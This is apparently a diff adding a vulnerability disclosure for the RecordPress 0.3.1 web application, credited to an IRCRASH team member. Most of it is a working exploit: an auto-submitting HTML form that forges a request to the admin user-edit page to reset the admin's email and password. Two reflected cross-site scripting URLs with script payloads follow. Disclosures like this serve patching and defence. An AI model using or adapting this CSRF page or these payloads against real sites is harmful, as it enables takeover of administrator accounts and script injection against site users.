@@ -1,0 +1,50 @@
+----------------------------------------------------------------
+WebApplication : RecordPress 0.3.1
+Type of vunlnerability : CSRF ( Change Admin Password ) And XSS
+Risk of use : Medium
+----------------------------------------------------------------
+Producer Website : http://www.recordpress.org/
+----------------------------------------------------------------
+Discovered by : Khashayar Fereidani
+Team Website : http://IRCRASH.COM
+Team Members : Khashayar Fereidani - Sina YazdanMehr - Arash Allebrahim
+English Forums : Http://IRCRASH.COM/forums/
+Email : irancrash [ a t ] gmail [ d o t ] com
+Facebook : http://facebook.com/fereidani
+----------------------------------------------------------------
+
+CSRF For Change Admin Password :
+
+<html>
+<head></head>
+<body onLoad=javascript:document.form.submit()>
+
+<form action="http://examplesite/admin/rp-settings-users-edit-db.php?id=1";
+
+method="POST" name="form">
+
+<input type="hidden" name="formusername" value="admin">
+
+<input type="hidden" name="formname" value="admin">
+
+<input type="hidden" name="formemail" value="email@pwnedpwnedpwned.sss">
+
+<input type="hidden" name="formpass" value="password">
+
+<input type="hidden" name="formpass2" value="password">
+
+<input type="hidden" name="formadminstatus" value="2">
+
+<input type="hidden" name="rp-settings-users-edit-db" value="Confirm+%BB">
+
+
+</form>
+</body>
+</html>
+
+------------------------------------------------
+
+Cross Site Scripting Vulnerabilities :
+
+http://examplesite/header.php?row[titledesc]=<script>alert(123)</script>
+http://examplesite/admin/rp-menu.php?_SESSION[sess_user]=<script>alert(123)</script>
